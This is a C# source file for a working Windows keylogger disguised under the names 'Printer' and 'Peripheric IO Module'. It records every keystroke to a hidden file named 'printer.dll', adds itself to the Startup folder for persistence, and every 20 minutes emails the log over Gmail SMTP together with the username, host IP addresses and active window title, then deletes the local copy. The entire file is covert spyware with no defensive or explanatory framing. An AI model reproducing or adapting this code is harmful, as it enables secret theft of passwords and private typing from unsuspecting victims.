using IWshRuntimeLibrary;
using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Timers;



namespace Printer 
{


    class Program
    {

        private string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\printer.dll";

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hwnd, StringBuilder ss, int count);


        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);



        static void Main(string[] args)
        {

            new Program().start();

        }


        private void start() 
        {
            if (System.IO.File.Exists(path)) System.IO.File.SetAttributes(path, FileAttributes.Hidden);
            System.Timers.Timer t = new System.Timers.Timer();
            t.Interval = 60000 * 20; // 60000(1 minute) * the number of minutes
            t.Elapsed += SendNewMessage;
            t.AutoReset = true;
            t.Enabled = true;

            //Send To StartUp
            WshShell wsh = new WshShell();
            IWshRuntimeLibrary.IWshShortcut shortcut = wsh.CreateShortcut(
                Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\Peripheric IO Module.lnk") as IWshRuntimeLibrary.IWshShortcut;
            shortcut.TargetPath = AppDomain.CurrentDomain.BaseDirectory + @"\\Peripheric IO Module.exe";
            shortcut.WindowStyle = 1;
            shortcut.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            shortcut.Save();


            while (true)
            {
                Thread.Sleep(5);

                for (int i = 0; i < 127; i++)
                {

                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769)
                    {
                        Console.Write((char)i);
                      
                       
                        if (i == 16)
                        {

                            using (StreamWriter sw = System.IO.File.AppendText(path))
                            {
                                sw.Write("[SHIFT] ");
                                sw.Close();
                                break;
                            }

                        }
                        if (i == 9)
                        {

                            using (StreamWriter sw = System.IO.File.AppendText(path))
                            {
                                sw.Write("[TAB] ");
                                sw.Close();
                                break;
                            }

                        }

                        if (i == 13)
                        {

                            using (StreamWriter sw = System.IO.File.AppendText(path))
                            {
                                sw.Write("[ENTER] ");
                                sw.Close();
                                break;
                            }

                        }

                        if (i == 8)
                        {

                            using (StreamWriter sw = System.IO.File.AppendText(path))
                            {
                                sw.Write("[BACKSPACE] ");
                                sw.Close();
                                break;

                            }

                        }
                            using (StreamWriter sw = System.IO.File.AppendText(path))
                        {
                            System.IO.File.SetAttributes(path, FileAttributes.Hidden);
                            sw.Write((char)i);
                            sw.Close();
                            
                        }
                      
                    }

                }

            }

        }



        private void SendNewMessage(Object source, ElapsedEventArgs e)
        {
            string ActiveWindowTitle()
            {
                //Create the variable
                const int nChar = 256;
                StringBuilder ss = new StringBuilder(nChar);

                //Run GetForeGroundWindows and get active window informations
                //assign them into handle pointer variable
                IntPtr handle = IntPtr.Zero;
                handle = GetForegroundWindow();

                if (GetWindowText(handle, ss, nChar) > 0) return ss.ToString();
                else return "";
            }

            try
            {

                string proccess = ActiveWindowTitle();
                string emailBody = "";
                string emailHeader = "";
             
                //time variable
                DateTime now = DateTime.Now;
               
                string subject = "Logs From " + Environment.UserDomainName + "\\" + Environment.UserName;
               
                var host = Dns.GetHostEntry(Dns.GetHostName());

                foreach (var adress in host.AddressList)
                {
                    emailHeader += "Adress: " + adress;
                }


                //Email Data Header

                emailHeader += "\n User: " + Environment.UserDomainName + "\\" + Environment.UserName;
                emailHeader += "\nHost: " + host;
                emailHeader += "\nTime: " + now.ToString();
                emailHeader += "\nProccess: " + proccess + "\n";

                if (!System.IO.File.Exists(path))
                {
                    return;
                }

                StreamReader sr = new StreamReader(path);
                string TempContent = sr.ReadLine();
                sr.Close();
                System.IO.File.Delete(path);

                emailBody = emailHeader + TempContent;

                SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
                MailMessage mailMessage = new MailMessage();
                

                mailMessage.From = new MailAddress("EMAIL");
                mailMessage.To.Add("EMAIL");
                mailMessage.Subject = subject;
                client.UseDefaultCredentials = false;
                client.EnableSsl = true;
                client.Credentials = new System.Net.NetworkCredential("EMAIL", "PASSWORD");
                mailMessage.Body = emailBody;

                client.Send(mailMessage);

            }

            
            catch (Exception ex)
            { 
            }

        }
       
        
    }

    
}
